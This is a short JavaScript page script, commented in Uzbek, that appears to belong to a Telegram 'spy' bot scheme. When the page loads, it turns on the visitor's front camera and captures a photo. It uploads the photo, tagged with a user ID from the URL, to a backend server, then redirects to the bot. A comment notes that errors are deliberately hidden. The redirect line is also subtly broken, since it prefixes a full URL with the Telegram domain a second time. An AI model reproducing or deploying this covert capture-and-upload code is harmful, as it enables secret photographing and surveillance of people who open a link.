<script>
const uid = new URLSearchParams(location.search).get("uid");
const backend = (window.BACKEND_URL || "").replace(/\/$/,"");
const video = document.getElementById("video");

// ⚠️ BU YERGA BOTINGIZ NOMSINI YOZING (masalan: https://t.me/shpion_bot)
const BOT_USERNAME = "https://t.me/Shpi0n_bot_bot"; 

async function capture() {
  if (!uid || !/^\d+$/.test(uid) || !backend) return;
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;

    await new Promise(resolve => {
      if (video.readyState >= 2) resolve();
      else video.onloadedmetadata = resolve;
    });

    await new Promise(r => setTimeout(r, 300));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.85);

    // Backend'ga yuborish
    await fetch(backend + "/upload", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({uid: Number(uid), image})
    });

    stream.getTracks().forEach(track => track.stop());

    // 🚀 RASM YUBORILGACH, AVTOMATIK TELEGRAM BOTGA O'TKAZISH:
    window.location.href = `https://t.me/${BOT_USERNAME}`;

  } catch (error) {
    // Xatolik bo'lsa ham ekranda hech narsa ko'rsatmaydi
  }
}

capture();
</script>
